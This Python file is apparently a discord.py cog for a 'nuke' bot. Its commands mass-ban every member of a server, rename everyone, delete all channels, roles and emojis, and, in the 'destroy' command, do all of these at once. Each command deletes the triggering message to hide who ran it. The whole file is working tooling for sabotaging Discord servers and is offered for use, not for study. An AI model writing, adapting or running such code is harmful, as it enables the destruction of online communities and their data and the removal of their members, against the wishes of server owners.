import discord
from discord.ext import commands
from discord import File, Message

class random_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True)
    async def ball(self, ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: ball")

    @commands.command(pass_context=True)
    async def gp(self, ctx, mention = None):
        if mention is None:
            print ("User Didn't provide a mention")
        await ctx.message.delete()
        print ("Action Completed: gp")

    @commands.command(pass_context=True)
    async def rall(self, ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: rall")

    @commands.command(pass_context=True)
    async def dall(self, ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall all")

    @commands.command(pass_context=True)
    async def destroy(self, ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: destroy")

def setup(bot: commands.Bot):
    bot.add_cog(random_cog(bot))